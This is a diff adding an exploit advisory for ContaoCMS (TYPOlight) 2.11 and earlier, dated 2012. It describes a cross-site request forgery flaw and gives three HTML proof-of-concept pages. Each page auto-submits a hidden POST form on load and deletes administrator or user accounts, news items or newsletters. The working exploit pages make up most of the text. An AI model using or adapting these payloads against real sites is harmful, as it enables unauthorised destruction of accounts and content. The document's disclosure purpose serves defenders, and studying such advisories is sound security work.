@@ -1,0 +1,56 @@
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title : ContaoCMS (aka TYPOlight) <= 2.11 CSRF (Delete Admin- Delete Article)
+# Date          : 25-02-2012
+# Author        : Ivano Binetti (http://ivanobinetti.com)
+# Software link : http://www.contao.org/en/download.html
+# Vendor site   : http://www.contao.org
+# Version       : 2.11.0 (latest) and lower 
+# Tested on     : Debian Squeeze (6.0) 
++--------------------------------------------------------------------------------------------------------------------------------+
++------------------------------------------[Multiple Vulnerabilities by Ivano Binetti]-------------------------------------------+
+
+Summary
+1)Introduction
+2)Vulnerabilities Description
+  2.1 Delete Administrators or Users 
+  2.2 Delete News
+  2.3 Delete Newsletter
++--------------------------------------------------------------------------------------------------------------------------------+
+1)Introduction
+Contao (fka TYPOlight) is "an open source content management system (CMS) for people who want a professional internet presence that
+is easy to maintain".
+
+2)Vulnerabilities Description
+Contao 2.11 (and lower)  is affected by CSRF Vulnerability which allows an attacker to delete admins/users, delete web pages 
+(articles, news, newsletter and so on).
+ 
+ 2.1 Delete Administrators or Users
+  <html>
+  <body onload="javascript:document.forms[0].submit()">
+  <H2>CSRF Exploit to delete ADMIN/USER account</H2>
+  <form method="POST" name="form0" action="http://<contao_ip>:80/contao/main.php?do=user&act=delete&id=2">
+  </body>
+  </html>
+
+  Note that the is possible to delete any admin/user, also the first administrator (id=1) created during Contao's installation phase.
+  
+  2.2 Delete News
+  <html>
+  <body onload="javascript:document.forms[0].submit()">
+  <H2>CSRF Exploit to delete News</H2>
+  <form method="POST" name="form0" action="http://<contao_ip>:80/contao/main.php?do=news&act=delete&id=1">
+  </form>
+  </body>
+  </html>
+
+
+  2.3 Delete Newsletter 
+  <html>
+  <body onload="javascript:document.forms[0].submit()">
+  <H2>CSRF Exploit to delete Newsletter</H2>
+  <form method="POST" name="form0" action="http://<contao_ip>:80/contao/contao/main.php?do=newsletter&act=delete&id=1">
+  </form>
+  </body>
+  </html>
++--------------------------------------------------------------------------------------------------------------------------------+
+  
